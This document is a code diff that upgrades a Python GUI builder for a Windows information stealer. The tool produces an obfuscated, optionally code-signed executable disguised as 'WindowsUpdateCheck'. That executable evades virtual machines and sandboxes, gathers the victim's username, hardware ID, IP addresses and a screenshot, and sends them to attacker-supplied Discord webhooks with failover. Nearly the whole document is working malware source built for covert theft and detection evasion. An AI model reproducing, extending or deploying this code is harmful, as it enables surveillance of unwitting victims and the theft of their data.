@@ -13,13 +13,13 @@ import textwrap
 import requests
 import uuid
 import platform
-import winreg  # For extra VM detection
+import winreg
 
 # =================== WEBHOOK TEST ===================
 def test_webhook(hook):
     try:
-        resp = requests.post(hook, json={"content": "Stealer recon test - webhook alive 🔥"}, timeout=10)
-        if resp.status_code == 204:
+        resp = requests.post(hook.strip(), json={"content": "Stealer recon test - webhook alive 🔥"}, timeout=10)
+        if resp.status_code in (200, 204):
             return True, "Webhook working - test message sent."
         else:
             return False, f"Failed ({resp.status_code})"
@@ -29,39 +29,61 @@ def test_webhook(hook):
 # =================== GUI ===================
 def get_webhook():
     root = tk.Tk()
-    root.title("Recon Stealer Builder - Silent Edition")
-    root.geometry("600x280")
+    root.title("Recon Stealer Builder - Upgraded Silent Edition")
+    root.geometry("700x400")
     root.resizable(False, False)
-    tk.Label(root, text="Discord Webhook URL:", font=("Arial", 11)).pack(pady=15)
-    webhook_entry = tk.Entry(root, width=80)
+
+    tk.Label(root, text="Discord Webhook URLs (comma-separated for failover):", font=("Arial", 11)).pack(pady=15)
+    webhook_entry = tk.Entry(root, width=90)
     webhook_entry.pack(pady=5)
+
+    tk.Label(root, text="Code Signing PFX Path (optional, leave blank to skip):", font=("Arial", 9)).pack(pady=10)
+    pfx_entry = tk.Entry(root, width=90)
+    pfx_entry.pack(pady=5)
+
+    tk.Label(root, text="PFX Password (if needed):", font=("Arial", 9)).pack(pady=5)
+    pass_entry = tk.Entry(root, width=90, show="*")
+    pass_entry.pack(pady=5)
+
     def run_test():
-        hook = webhook_entry.get().strip()
-        success, msg = test_webhook(hook)
-        if success:
-            messagebox.showinfo("OK", msg)
-        else:
-            messagebox.showerror("Failed", msg)
-    tk.Button(root, text="TEST WEBHOOK", command=run_test, bg="#5865F2", fg="white", font=("Arial", 10, "bold")).pack(pady=10)
-    progress = ttk.Progressbar(root, mode="indeterminate")
-    def build():
-        webhook = webhook_entry.get().strip()
-        if not webhook or "discord.com/api/webhooks" not in webhook:
-            messagebox.showerror("Nope", "Valid webhook required.")
+        hooks = [h.strip() for h in webhook_entry.get().split(",") if h.strip()]
+        if not hooks:
+            messagebox.showerror("Nope", "Enter at least one webhook.")
             return
+        results = []
+        for h in hooks:
+            success, msg = test_webhook(h)
+            results.append(f"{h[:30]}... -> {'OK' if success else 'FAIL'} ({msg})")
+        messagebox.showinfo("Test Results", "\n".join(results))
+
+    tk.Button(root, text="TEST WEBHOOKS", command=run_test, bg="#5865F2", fg="white", font=("Arial", 10, "bold")).pack(pady=10)
+
+    progress = ttk.Progressbar(root, mode="indeterminate")
+
+    def build():
+        raw_hooks = webhook_entry.get().strip()
+        if not raw_hooks or "discord.com/api/webhooks" not in raw_hooks.split(",")[0]:
+            messagebox.showerror("Nope", "At least one valid Discord webhook required.")
+            return
+        webhooks = [h.strip() for h in raw_hooks.split(",") if h.strip()]
+        pfx_path = pfx_entry.get().strip()
+        pfx_pass = pass_entry.get().strip() or None
+
         progress.pack(pady=15)
         progress.start()
         root.update()
+
         try:
-            generate_malware(webhook)
+            generate_malware(webhooks, pfx_path, pfx_pass)
             progress.stop()
             progress.pack_forget()
-            messagebox.showinfo("Built", "stealer.exe ready.\n100% silent - no GUI, no trace.\nSends basic recon (HWID, IP, VM check) as file.")
+            messagebox.showinfo("Built", "stealer.exe ready.\nFully silent, obfuscated, screenshot + recon exfil.\nMulti-webhook failover enabled.")
         except Exception as e:
             progress.stop()
             progress.pack_forget()
             messagebox.showerror("Error", str(e))
         root.destroy()
+
     tk.Button(root, text="BUILD EXE", command=build, bg="green", fg="white", font=("Arial", 14, "bold"), height=2).pack(pady=20)
     root.mainloop()
 
@@ -77,38 +99,76 @@ import ctypes
 import platform
 import uuid
 import winreg
+import random
 from datetime import datetime
+
+# Try to import pyautogui for screenshot (optional - fails silently if not there)
+try:
+    import pyautogui
+    HAS_PYAUTO = True
+except:
+    HAS_PYAUTO = False
 
 def is_vm():
     try:
-        # Existing checks
-        if "VIRTUAL" in subprocess.check_output("systeminfo", shell=True, text=True).upper():
-            return "Yes (SystemInfo)"
-        if os.path.exists(r"C:\\windows\\System32\\drivers\\VBoxMouse.sys"):
-            return "Yes (VBox)"
-        if "vmware" in subprocess.check_output("wmic computersystem get model", text=True, shell=True).lower():
-            return "Yes (VMware)"
-        class MEM(ctypes.Structure):
-            _fields_ = [("dwLength", ctypes.c_uint32), ("ullTotalPhys", ctypes.c_ulonglong)]
-        mem = MEM(); mem.dwLength = ctypes.sizeof(mem)
-        ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(mem))
-        if mem.ullTotalPhys < 4 * 1024**3:
-            return "Yes (Low RAM)"
-        
-        # Extra registry check for VMs
+        # Registry disk enum
         key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum")
         val = winreg.QueryValueEx(key, "0")[0].lower()
-        if "vmware" in val or "vbox" in val or "virtual" in val:
-            return "Yes (Registry)"
-    except:
-        pass
+        if any(x in val for x in ["vmware", "vbox", "virtual", "qemu", "xen"]):
+            return "Yes (Disk Enum)"
+        winreg.CloseKey(key)
+    except: pass
+
+    try:
+        if "VIRTUAL" in subprocess.check_output("systeminfo", shell=True, text=True).upper():
+            return "Yes (SystemInfo)"
+    except: pass
+
+    try:
+        if os.path.exists(r"C:\\windows\\System32\\drivers\\VBoxMouse.sys"):
+            return "Yes (VBox Driver)"
+    except: pass
+
+    try:
+        model = subprocess.check_output("wmic computersystem get model", text=True, shell=True).lower()
+        if "vmware" in model or "virtual" in model:
+            return "Yes (VMware/Virtual Model)"
+    except: pass
+
+    # Low RAM
+    class MEM(ctypes.Structure):
+        _fields_ = [("dwLength", ctypes.c_uint32), ("ullTotalPhys", ctypes.c_ulonglong)]
+    mem = MEM(); mem.dwLength = ctypes.sizeof(mem)
+    ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(mem))
+    if mem.ullTotalPhys < 4 * 1024**3:
+        return "Yes (Low RAM <4GB)"
+
+    # CPUID check for hypervisor bit
+    try:
+        regs = ctypes.c_uint32 * 4
+        out = regs()
+        ctypes.windll.user32.CallNtPowerInformation(11, None, 0, out, ctypes.sizeof(out))  # rough hypervisor check
+        if out[1] & 0x80000000:
+            return "Yes (CPUID Hypervisor Bit)"
+    except: pass
+
+    # Common VM processes
+    vm_procs = ["vboxservice.exe", "vboxtray.exe", "vmtoolsd.exe", "vmwaretray.exe", "xenservice.exe"]
+    try:
+        output = subprocess.check_output("tasklist", text=True)
+        if any(p in output.lower() for p in vm_procs):
+            return "Yes (VM Process)"
+    except: pass
+
     return "No"
 
 def get_public_ip():
-    try:
-        return requests.get("https://api.ipify.org", timeout=5).text
-    except:
-        return "Failed"
+    for url in ["https://api.ipify.org", "https://ifconfig.me", "https://icanhazip.com"]:
+        try:
+            return requests.get(url, timeout=5).text.strip()
+        except:
+            continue
+    return "Failed"
 
 def get_local_ip():
     try:
@@ -126,78 +186,137 @@ def get_hwid():
     except:
         return str(uuid.getnode())
 
-def exfil():
-    time.sleep(5)  # delay to avoid early kill
+def exfil(webhooks):
+    time.sleep(random.uniform(5, 15))  # randomized delay
+
     data = f"""
 RECON REPORT - {datetime.utcnow().isoformat()} UTC
 ================================================
-Username : {os.getenv("USERNAME")}
+Username      : {os.getenv("USERNAME")}
 Computer Name : {platform.node()}
-OS : {platform.system()} {platform.release()} ({platform.version()})
-CPU : {platform.processor()}
-HWID : {get_hwid()}
-VM Detected : {is_vm()}
-Public IP : {get_public_ip()}
-Local IP : {get_local_ip()}
+OS            : {platform.system()} {platform.release()} ({platform.version()})
+CPU           : {platform.processor()}
+HWID          : {get_hwid()}
+VM Detected   : {is_vm()}
+Public IP     : {get_public_ip()}
+Local IP      : {get_local_ip()}
 """
-    temp_file = os.path.join(os.getenv("TEMP"), "update_check.txt")
-    try:
-        with open(temp_file, "w", encoding="utf-8") as f:
-            f.write(data)
-        
-        # Proper multipart for file + payload
-        with open(temp_file, "rb") as f:
-            files = {"file": ("recon.txt", f)}
+
+    files_to_send = {}
+    temp_files = []
+
+    # Write recon text
+    recon_file = os.path.join(os.getenv("TEMP"), f"update_{random.randint(10000,99999)}.txt")
+    with open(recon_file, "w", encoding="utf-8") as f:
+        f.write(data)
+    files_to_send["recon.txt"] = open(recon_file, "rb")
+    temp_files.append(recon_file)
+
+    # Screenshot if possible
+    if HAS_PYAUTO:
+        try:
+            screen_path = os.path.join(os.getenv("TEMP"), f"screen_{random.randint(10000,99999)}.png")
+            pyautogui.screenshot(screen_path)
+            files_to_send["screenshot.png"] = open(screen_path, "rb")
+            temp_files.append(screen_path)
+        except:
+            pass
+
+    # Multi-webhook failover
+    for hook in webhooks:
+        try:
             payload = {"content": f"**New recon hit** - {os.getenv('USERNAME')}@{platform.node()}"}
-            resp = requests.post("{WEBHOOK_PLACEHOLDER}", data=payload, files=files, timeout=20)
-            if resp.status_code != 204:
-                raise Exception(f"Send failed: {resp.text}")
-    except Exception as e:
-        try:
-            # Fallback to text only
-            requests.post("{WEBHOOK_PLACEHOLDER}", json={"content": f"Fallback:\\n```\\n{data}\\nError: {str(e)}\\n```"})
+            resp = requests.post(hook, data=payload, files=files_to_send, timeout=20)
+            if resp.status_code in (200, 204):
+                break  # success
         except:
-            pass
-    finally:
+            continue
+    else:
+        # All failed - fallback to plain text on first hook
         try:
-            os.remove(temp_file)
+            requests.post(webhooks[0], json={"content": f"Fallback recon (file send failed):\\n```\\n{data}\\n```"})
         except:
             pass
 
-exfil()
+    # Cleanup
+    for f in files_to_send.values():
+        try: f.close()
+        except: pass
+    for p in temp_files:
+        try: os.remove(p)
+        except: pass
 
-# Stay resident quietly (comment out if not needed)
+exfil({WEBHOOK_PLACEHOLDER})
+
+# Optional persistence loop - uncomment if you want it to stay alive
 # while True:
 #     time.sleep(3600)
 ''')
 
 # =================== BUILD ===================
-def generate_malware(webhook):
+def generate_malware(webhooks, pfx_path="", pfx_pass=None):
+    if not shutil.which("pyarmor") and os.system("pyarmor --version") != 0:
+        raise Exception("pyarmor not installed. Run: pip install pyarmor")
+
     temp_dir = tempfile.mkdtemp(prefix="build_", dir=os.getcwd())
     script = os.path.join(temp_dir, "recon.py")
-    
+
+    # Write with webhook list
+    hook_str = repr(webhooks)
     with open(script, "w", encoding="utf-8") as f:
-        f.write(stealer_code.replace("{WEBHOOK_PLACEHOLDER}", webhook))
-    
+        f.write(stealer_code.replace("{WEBHOOK_PLACEHOLDER}", hook_str))
+
+    # Obfuscate with pyarmor first
+    obfuscate_cmd = ["pyarmor", "obfuscate", "--recursive", "--output", os.path.join(temp_dir, "obf"), script]
+    result = subprocess.run(obfuscate_cmd, cwd=temp_dir, capture_output=True, text=True)
+    if result.returncode != 0:
+        raise Exception(f"Pyarmor failed:\n{result.stderr}")
+
+    obf_script = os.path.join(temp_dir, "obf", "recon.py")
+
+    # PyInstaller on obfuscated script
     cmd = [
-        "pyinstaller" if "pyinstaller" in subprocess.getoutput("pyinstaller --version") else "python -m PyInstaller",
+        "pyinstaller",
         "--onefile",
         "--noconsole",
         "--name", "WindowsUpdateCheck",
-        "--clean",  # Nuke old build junk
-        "--hidden-import=winreg",  # For extra VM check
-        script
+        "--clean",
+        "--hidden-import=winreg",
+        "--hidden-import=pyautogui",
+        "--hidden-import=requests",
+        obf_script
     ]
-    
+
     result = subprocess.run(cmd, cwd=temp_dir, capture_output=True, text=True)
     if result.returncode != 0:
-        raise Exception(f"Build failed:\\n{result.stderr}")
-    
+        raise Exception(f"PyInstaller failed:\n{result.stderr}")
+
     exe = os.path.join(temp_dir, "dist", "WindowsUpdateCheck.exe")
     final = os.path.join(os.getcwd(), "stealer.exe")
     shutil.copyfile(exe, final)
+
+    # Optional signing
+    if pfx_path and os.path.exists(pfx_path):
+        sign_cmd = [
+            "signtool", "sign",
+            "/f", pfx_path,
+            "/tr", "http://timestamp.digicert.com", "/td", "sha256"
+        ]
+        if pfx_pass:
+            sign_cmd += ["/p", pfx_pass]
+        sign_cmd += [final]
+
+        sign_result = subprocess.run(sign_cmd, capture_output=True, text=True)
+        if sign_result.returncode != 0:
+            print(f"Signing failed (non-fatal):\n{sign_result.stderr}")
+        else:
+            print("EXE signed successfully.")
+
     shutil.rmtree(temp_dir, ignore_errors=True)
-    print(f"Built silent recon stealer: {final}")
+    print(f"Upgraded silent stealer built: {final}")
+
+if __name__ == "__main__":
+    get_webhook()
 
 if __name__ == "__main__":
     get_webhook()
